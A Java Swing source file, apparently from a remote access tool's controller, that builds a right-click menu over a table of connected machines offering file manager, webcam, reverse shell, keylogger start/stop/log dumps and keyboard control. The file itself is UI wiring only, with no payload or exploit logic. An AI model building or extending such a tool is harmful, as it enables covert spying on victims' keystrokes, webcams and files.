package GUI.TableUtils.Configuration;

import Connections.ClientErrorHandler;
import Connections.Streams;
import GUI.JsGUI;
import GUI.Main;
import GUI.TableUtils.FileManager.Listener.FileManagerMenuListener;
import GUI.TableUtils.KeyLogger.KeyLoggerEventsListener;
import GUI.TableUtils.KeyLogger.KeyLoggerMenuListener;
import GUI.TableUtils.KeyLogger.KeyloggerEvents;
import GUI.TableUtils.KeyboardController.KeyboardControllerMenuListener;
import GUI.TableUtils.ReverseShell.ReverseShellMenuListener;
import GUI.TableUtils.Webcam.WebcamMenuListener;

import javax.swing.*;
import javax.swing.event.MenuEvent;
import javax.swing.event.MenuListener;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.io.IOException;
import java.net.Socket;
import java.util.concurrent.ConcurrentHashMap;

public class TablePopUpListener extends MouseAdapter {

    private final JsGUI mainGUI;

    public TablePopUpListener(JsGUI mainGUI) {
        this.mainGUI = mainGUI;
        createConnectedPopUpMenu();
        createDisconnectedPopUpMenu();
    }

    JPopupMenu disconnectedPopUpMenu = new JPopupMenu();

    private void createDisconnectedPopUpMenu() {
        JMenuItem removeRowItem = new JMenuItem("Remove row");
        disconnectedPopUpMenu.add(removeRowItem);
        removeRowItem.addActionListener(e -> mainGUI.getConnectionsDefaultTableModel().removeRow(mainGUI.getConnectionsTable().getSelectedRow()));
    }

    // Menus of table
    private JPopupMenu connectedPopUpMenu;

    private void createConnectedPopUpMenu() {
        connectedPopUpMenu = new JPopupMenu();
        JMenuItem fileManagerMenu = new JMenuItem("File manager");
        JMenuItem webcamMenu = new JMenuItem("Webcam manager");
        JMenuItem reverseShellMenu = new JMenuItem("Reverse shell");
        JMenu keyloggerMenuOptions = new JMenu("Keylogger options");
        JMenuItem startKeyloggerMenu = new JMenuItem("Start");
        JMenuItem stopKeyloggerMenu = new JMenuItem("Stop");
        JMenuItem dumpLogsMenu = new JMenuItem("Dump last log");
        JMenuItem dumpAllLogsMenu = new JMenuItem("Dump all logs");
        keyloggerMenuOptions.add(startKeyloggerMenu);
        keyloggerMenuOptions.add(stopKeyloggerMenu);
        keyloggerMenuOptions.add(dumpLogsMenu);
        keyloggerMenuOptions.add(dumpAllLogsMenu);
        JMenuItem keyboardController = new JMenuItem("Keyboard controller");

        // add to popup
        connectedPopUpMenu.add(fileManagerMenu);
        connectedPopUpMenu.add(webcamMenu);
        connectedPopUpMenu.add(reverseShellMenu);
        connectedPopUpMenu.add(keyloggerMenuOptions);
        connectedPopUpMenu.add(keyboardController);


        JTable connectionsTable = mainGUI.getConnectionsTable();
        ConcurrentHashMap<Socket, Streams> mapOfConnections = mainGUI.getMap();
        // set actions
        webcamMenu.addActionListener(new WebcamMenuListener(connectionsTable, mapOfConnections, mainGUI));
        fileManagerMenu.addActionListener(new FileManagerMenuListener(connectionsTable, mapOfConnections, mainGUI));
        reverseShellMenu.addActionListener(new ReverseShellMenuListener(connectionsTable, mapOfConnections, mainGUI));
        keyloggerMenuOptions.addMenuListener(new KeyLoggerMenuListener(mapOfConnections,new JMenuItem[]{startKeyloggerMenu,stopKeyloggerMenu}));
        startKeyloggerMenu.addActionListener(new KeyLoggerEventsListener(connectionsTable, mapOfConnections, KeyloggerEvents.START));
        stopKeyloggerMenu.addActionListener(new KeyLoggerEventsListener(connectionsTable, mapOfConnections, KeyloggerEvents.STOP));
        dumpLogsMenu.addActionListener(new KeyLoggerEventsListener(connectionsTable, mapOfConnections, KeyloggerEvents.DUMP_LAST));
        dumpAllLogsMenu.addActionListener(new KeyLoggerEventsListener(connectionsTable, mapOfConnections, KeyloggerEvents.DUMP_ALL));
        keyboardController.addActionListener(new KeyboardControllerMenuListener(connectionsTable, mapOfConnections, mainGUI));
    }

    @Override
    public void mouseReleased(MouseEvent e) {
        if (e.isPopupTrigger()) {
            JTable source = (JTable) e.getSource();
            int row = source.rowAtPoint(e.getPoint());
            int column = source.columnAtPoint(e.getPoint());
            if (!source.isRowSelected(row)) source.changeSelection(row, column, false, false);
            if (mainGUI.getConnectionsDefaultTableModel().getValueAt(row, 5).equals("Connected")) {
                connectedPopUpMenu.show(e.getComponent(), e.getX(), e.getY());
            } else disconnectedPopUpMenu.show(e.getComponent(), e.getX(), e.getY());
        }
    }
}
